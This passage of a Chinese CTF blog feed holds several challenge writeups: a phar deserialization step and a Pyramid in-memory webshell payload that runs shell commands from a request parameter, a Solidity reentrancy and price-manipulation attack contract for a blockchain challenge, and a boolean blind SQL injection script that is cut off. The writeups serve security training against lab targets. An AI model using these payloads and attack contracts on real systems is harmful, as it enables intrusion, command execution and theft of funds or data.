invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">yesterday</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由此生成phar.phar文件，将后缀名改为.atg，然后上传</p><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250416200453131.png"alt="image-20250416200453131" /><figcaption aria-hidden="true">image-20250416200453131</figcaption></figure><p>利用phar协议不看后缀名的特性，在filename处触发反序列化，post传参wow执行命令，这次flag在环境变量里</p><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250416200818751.png"alt="image-20250416200818751" /><figcaption aria-hidden="true">image-20250416200818751</figcaption></figure><h4 id="熟悉的配方熟悉的味道">熟悉的配方，熟悉的味道</h4><p>题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyramid.config <span class="keyword">import</span> Configurator</span><br><span class="line"><span class="keyword">from</span> pyramid.request <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> pyramid.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> pyramid.view <span class="keyword">import</span> view_config</span><br><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"><span class="keyword">from</span> pyramid.events <span class="keyword">import</span> NewResponse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment, BaseLoader</span><br><span class="line"></span><br><span class="line">eval_globals = &#123; <span class="comment">#防止eval执行恶意代码</span></span><br><span class="line">    <span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;,      <span class="comment"># 禁用所有内置函数</span></span><br><span class="line">    <span class="string">&#x27;__import__&#x27;</span>: <span class="literal">None</span>       <span class="comment"># 禁止动态导入</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkExpr</span>(<span class="params">expr_input</span>):</span><br><span class="line">    expr = re.split(<span class="string">r&quot;[-+*/]&quot;</span>, expr_input)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">exec</span>(expr_input))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(expr) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">int</span>(expr[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">int</span>(expr[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home_view</span>(<span class="params">request</span>):</span><br><span class="line">    expr_input = <span class="string">&quot;&quot;</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        expr_input = request.POST[<span class="string">&#x27;expr&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> checkExpr(expr_input):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result = <span class="built_in">eval</span>(expr_input, eval_globals)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                result = e</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = <span class="string">&quot;爬！&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    template_str = 【xxx】</span><br><span class="line"></span><br><span class="line">    env = Environment(loader=BaseLoader())</span><br><span class="line">    template = env.from_string(template_str)</span><br><span class="line">    rendered = template.render(expr_input=expr_input, result=result)</span><br><span class="line">    <span class="keyword">return</span> Response(rendered)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> Configurator() <span class="keyword">as</span> config:</span><br><span class="line">        config.add_route(<span class="string">&#x27;home_view&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        config.add_view(home_view, route_name=<span class="string">&#x27;home_view&#x27;</span>)</span><br><span class="line">        app = config.make_wsgi_app()</span><br><span class="line"></span><br><span class="line">    server = make_server(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">9040</span>, app)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据<ahref="https://xz.aliyun.com/news/16090?u_atoken=87dba66839b39d2b13eae6e4583416ca&amp;u_asig=0a47309317440258787906072e00fe">这篇文章</a>写入pyramid框架的内存马</p><p>payload</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config.add_route(&#x27;shell&#x27;, &#x27;/shell&#x27;);config.add_view(lambda request:Response(__import__(&#x27;os&#x27;).popen(request.params.get(&#x27;1&#x27;)).read()),route_name=&#x27;shell&#x27;);app = config.make_wsgi_app()</span><br></pre></td></tr></table></figure><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250418170240811.png"alt="image-20250418170240811" /><figcaption aria-hidden="true">image-20250418170240811</figcaption></figure><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250418170307560.png"alt="image-20250418170307560" /><figcaption aria-hidden="true">image-20250418170307560</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> TGCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X1ct34m 2025 Misc 招新题 x1cbank Official Writeup</title>
      <link href="/posts/73977bd5/"/>
      <url>/posts/73977bd5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>今年也是轮到我出招新题了()</p><p>总共两题，w8nn9z出一题，我出一题。</p><p>出了个区块链，考点其实挺基础的:)<del>人话：懒得思考直接去网上搞了两题下来改了改出了个拼好题</del></p></blockquote><p>出题时用的还是<ahref="https://github.com/chainflag/solidctf">solidctf</a>项目，一些交互方式就不再赘述了。</p><p>题目合约如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLISCENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">interface Quote &#123;</span><br><span class="line">    function price() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Bank &#123;</span><br><span class="line">    event EmitFlag(address indexed user);</span><br><span class="line">    uint256 cmp= 100 ether;</span><br><span class="line">    uint256 public lastWithdrawTime;</span><br><span class="line">    uint256 flagprice= 200 ether;</span><br><span class="line">    bool public flagEmitted;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    mapping(address =&gt; uint) public depositTimes;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Deposit must be positive&quot;);</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">        depositTimes[msg.sender] = block.timestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(block.timestamp - depositTimes[msg.sender] &lt; 1 days, &quot;Deposit expired...&quot;);</span><br><span class="line">        uint get = balances[msg.sender];</span><br><span class="line">        require(get &gt; 0, &quot;No money left :(&quot;);</span><br><span class="line">        require(block.timestamp - lastWithdrawTime &gt; 1 seconds, &quot;Hey bro, calm down!&quot;);</span><br><span class="line">        (bool sent, ) = msg.sender.call&#123;value: get&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Operation failed :(&quot;);</span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">        lastWithdrawTime = block.timestamp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ViewBalance(address ad) public view returns (uint) &#123;</span><br><span class="line">        uint bal=balances[ad];</span><br><span class="line">        return bal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy() public&#123;</span><br><span class="line">        require(balances[msg.sender]&gt;cmp,&quot;Poor guy......&quot;);</span><br><span class="line">        Quote _quote = Quote(msg.sender);</span><br><span class="line">        if (_quote.price() &gt;= flagprice &amp;&amp; !flagEmitted)&#123;</span><br><span class="line">            flagEmitted = true;</span><br><span class="line">            flagprice = _quote.price();</span><br><span class="line">        &#125;</span><br><span class="line">        require(balances[msg.sender]&gt;=flagprice,&quot;Not enough money......&quot;);</span><br><span class="line">        emit EmitFlag(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取一下题目合约地址</p><figure><imgsrc="/images/X1cT34m-2025-Misc-招新题-x1cbank-Official-Writeup/image-20250407141739660.png"alt="image-20250407141739660" /><figcaption aria-hidden="true">image-20250407141739660</figcaption></figure><p>拿到remix中at address一下，可以发现合约中已经存在了100 ether</p><figure><imgsrc="/images/X1cT34m-2025-Misc-招新题-x1cbank-Official-Writeup/image-20250407142117833.png"alt="image-20250407142117833" /><figcaption aria-hidden="true">image-20250407142117833</figcaption></figure><p>阅读合约不难发现，前半部分就是一个重入攻击的经典形式。</p><p>这里解释一下重入攻击，重入攻击是利用了合约中“先转账后记账”的特性——很显然bank合约的withdraw函数中就是如此——以及fallback这个函数的特殊作用。在solidity语言中，fallback函数是一个不带参数、没有返回值的匿名函数，值得注意的是，它会在外部账户或其他合约向该合约地址发送ether时自动被调用。而利用合约“先转账后记账”的漏洞，我们可以在转账完以后立马触发fallback函数，使其因为还没来得及记账导致被判断为满足条件而继续转账，由此把bank合约中的balance全部清空。</p><p>因此，我们可以写出第一部分的攻击合约，通过buy函数的第一个require判断。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    Bank public etherStore;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherStoreAddress) &#123;</span><br><span class="line">        etherStore = Bank(_etherStoreAddress);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        if (address(etherStore).balance &gt;= 1 ether) &#123;</span><br><span class="line">            etherStore.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether);</span><br><span class="line">        etherStore.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">        etherStore.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是第二部分</p><p>可以看到题目中给出了一个Quote接口用于报价，要求是报价高于200ether，且我们的余额高于目前的之前我们的报价，我们就可以把flag买下来。</p><p>这里的问题出在使用了两次_quote.price()来获取报价价格，且中间有个flagEmitted的标记，于是我们可以利用这个flagEmitted的标记来操纵flagprice。首先我们报出一个高于200ether的价格，这样就会通过if的检测使得flagEmitted变成true。而我们检测到flagEmitted变成true以后就立马改变我们的报价，报出一个低于我们当前balance的价格，使得flagprice变为这个价格。</p><p>这里实际上就是要完善Quote这个接口，另外还得注意的是我们得把之前重入攻击提出来的ether全部再存回去，使得题目合约能记到我们的攻击合约的账。</p><p>完整exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">interface Bank &#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function withdraw() external;</span><br><span class="line">    function buy() external;</span><br><span class="line">    function flagEmitted() external view returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Quote &#123;</span><br><span class="line">    function price() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack is Quote&#123;</span><br><span class="line">    Bank public etherStore;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherStoreAddress) &#123;</span><br><span class="line">        etherStore = Bank(_etherStoreAddress);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        if (address(etherStore).balance &gt;= 1 ether) &#123;</span><br><span class="line">            etherStore.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        require(address(this).balance &gt; 0, &quot;No funds to deposit&quot;);</span><br><span class="line">        etherStore.deposit&#123;value: address(this).balance&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether);</span><br><span class="line">        etherStore.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">        etherStore.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price() external view returns (uint256)&#123;</span><br><span class="line">        if (etherStore.flagEmitted() == false) &#123;</span><br><span class="line">            return 201 ether;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 1 ether;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy() external&#123;</span><br><span class="line">        etherStore.buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体操作：</p><p>先给我们自己的账户接一次水以便交手续费，然后将题目合约地址传给攻击合约的构造函数再deploy</p><figure><imgsrc="/images/X1cT34m-2025-Misc-招新题-x1cbank-Official-Writeup/image-20250407143852914.png"alt="image-20250407143852914" /><figcaption aria-hidden="true">image-20250407143852914</figcaption></figure><p>接一次水，对在我们之前at address的bank合约中操作，先存1ether进去</p><figure><imgsrc="/images/X1cT34m-2025-Misc-招新题-x1cbank-Official-Writeup/image-20250407145630189.png"alt="image-20250407145630189" /><figcaption aria-hidden="true">image-20250407145630189</figcaption></figure><p>再接一次水，在我们deploy的attack合约中操作，给msg.value设置为1ether，然后attack</p><figure><imgsrc="/images/X1cT34m-2025-Misc-招新题-x1cbank-Official-Writeup/image-20250407145910383.png"alt="image-20250407145910383" /><figcaption aria-hidden="true">image-20250407145910383</figcaption></figure><p>可以看到我们已经把这102ether全部提到了我们的攻击合约中。</p><p>然后再调用我们攻击合约中的deposit函数把这些ether全部存回去</p><figure><imgsrc="/images/X1cT34m-2025-Misc-招新题-x1cbank-Official-Writeup/image-20250407150039957.png"alt="image-20250407150039957" /><figcaption aria-hidden="true">image-20250407150039957</figcaption></figure><p>buy，获得flag</p><figure><imgsrc="/images/X1cT34m-2025-Misc-招新题-x1cbank-Official-Writeup/image-20250407150130374.png"alt="image-20250407150130374" /><figcaption aria-hidden="true">image-20250407150130374</figcaption></figure><figure><imgsrc="/images/X1cT34m-2025-Misc-招新题-x1cbank-Official-Writeup/image-20250407150211947.png"alt="image-20250407150211947" /><figcaption aria-hidden="true">image-20250407150211947</figcaption></figure><blockquote><p>当然肯定会有大手子问，筑波筑波，你这样打还是太吃操作了，我就不能写个脚本把我账户挂水龙头上三个小时凑够200ether买下flag吗？</p><p>我的回答是，当然可以，但这毕竟是考核题，肯定会问思路，无所谓了<del>（摆烂）</del>。。。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> Blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2025 Writeup</title>
      <link href="/posts/359b65ed/"/>
      <url>/posts/359b65ed/</url>
      
        <content type="html"><![CDATA[<blockquote><p>仍然是没有web没有pwn，全靠其他方向硬抗((</p></blockquote><h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/XYCTF2025Writeup.pdf">Writeup点我</a></h4><p>Additional Statement:</p><p>Cooperated with <strong>w8nn9z</strong>, <strong>1n1t</strong>,<strong>Hibiscus</strong>.</p><h2 id="复现部分">复现部分</h2><h3 id="misc">Misc</h3><h4 id="sins">sins</h4><p>题目源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;For there are three that bear record in heaven, the Father, the Word, and the Holy Ghost&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;But here we have four cases bearing witness&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">i_pow</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">4</span> == <span class="number">0</span>: <span class="comment"># as the 40 days of flood</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">1</span>: <span class="comment"># as the 1 true God</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;i&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">2</span>: <span class="comment"># as the 2 tablets of stone</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-1&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> n % <span class="number">4</span> == <span class="number">3</span>: <span class="comment"># as the 3 days in the tomb</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-i&#x27;</span></span><br><span class="line"></span><br><span class="line">inp = <span class="built_in">input</span>(<span class="string">&quot;wash away your sins: &quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(i <span class="keyword">in</span> <span class="string">&quot;i0123456789+-*%/^=&lt;&gt;~&amp;|:()[]&#x27;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> inp), <span class="string">&quot;invalid char&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(inp) &lt; <span class="number">16</span>, <span class="string">&quot;too long&quot;</span></span><br><span class="line">R = <span class="built_in">eval</span>(<span class="string">f&quot;lambda i: <span class="subst">&#123;inp&#125;</span>&quot;</span>, &#123;&#125;, &#123;&#125;)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(R(i) == i_pow(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>.from_bytes(<span class="string">b&#x27;The_adwa_shall_forgive_thee&#x27;</span>) // <span class="number">2</span>**<span class="number">195</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>这里对我们输入的要求是：</p><p>1.lambda定义的函数要相当于i_pow函数</p><p>2.输入的字符必须在i0123456789+-*%/^=&lt;&gt;~&amp;|:()[]'之中</p><p>3.输入的长度必须不能长于16</p><p>问ai以后可以知道这边可以使用字符串的切片，后续再修改一下，可以得到如下包含对输入进行模运算且步长为2的切片方法：</p><p>'1i--'[i&amp;3::-2]</p><p>长度是15，刚好够得到flag</p><h4 id="喜欢就说出来">喜欢就说出来</h4><p>翻看流量，能找到传输了一张png</p><figure><imgsrc="/images/XYCTF2025-Writeup/1744094465729-4a784336-db67-46e8-89c7-1bb1d763cd30.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>提取出来，发现这个png不大正常，有两个IHDR头</p><figure><imgsrc="/images/XYCTF2025-Writeup/1744094760958-b159cb5f-3377-40b6-b6a2-f9067e0aded2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>发现主要有两种长度的IDAT数据块，将其分类得到两张图片，然后再稍稍调整一下IDAT块的顺序让两张图片都显示完全</p><figure><imgsrc="/images/XYCTF2025-Writeup/1744095645618-6ee8e557-3467-4d21-a5fb-bbced69a4a7a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在其中一张图片中就有半个flag</p><figure><imgsrc="/images/XYCTF2025-Writeup/1744095682900-9cab34b0-40ab-4761-a015-00f247090765.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>接下来就是脑洞时间，这道题的题目描述是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小Shark在上课时和自己的暗恋对象坐在了一起，小Shark想要把悄悄话和文件传给同桌，可惜小Shark没有移动硬盘，不过这难不住聪明的小Shark，小Shark在同桌的电脑上敲了几下键盘，用自己的浏览器给同桌试传了两张自己的照片和一句悄悄话，你能发现小Shark对同桌说了什么吗？会不会是......520?!呢? </span><br></pre></td></tr></table></figure><p>所以类似lsb的操作，提取R=5, G=2,B=0这样三个通道的数据得到后半个flag</p><figure><imgsrc="/images/XYCTF2025-Writeup/1744095913481-8de029a8-dc06-4c69-ab55-7f75ab6c34a7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="web">Web</h3><h4 id="ezsql">ezsql</h4><p>先用万能密码就能进入到第二个页面，发现需要管理员密码</p><figure><img src="/images/XYCTF2025-Writeup/image-20250409164415401.png"alt="image-20250409164415401" /><figcaption aria-hidden="true">image-20250409164415401</figcaption></figure><figure><img src="/images/XYCTF2025-Writeup/image-20250409164433854.png"alt="image-20250409164433854" /><figcaption aria-hidden="true">image-20250409164433854</figcaption></figure><p>仍然去第一个页面进行布尔盲注，注出第二个页面的密码。其中发现username处有过滤，password没有，因此注password:)</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">exp = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#database()</span></span><br><span class="line"><span class="comment">#SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = database()</span></span><br><span class="line"><span class="comment">#SELECT secret FROM double_check</span></span><br><span class="line">wrong_code = <span class="string">&#x27;帐号或密码错误&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    min_num = <span class="number">32</span></span><br><span class="line">    max_num = <span class="number">128</span></span><br><span class="line">    mid_num = (min_num + max_num) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> min_num &lt; max_num:</span><br><span class="line">        payload = <span class="string">&quot;or(ascii(substr(&quot;</span> + <span class="string">&#x27;(&#x27;</span> + exp + <span class="string">&#x27;)&#x27;</span> + <span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(num, mid_num)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span 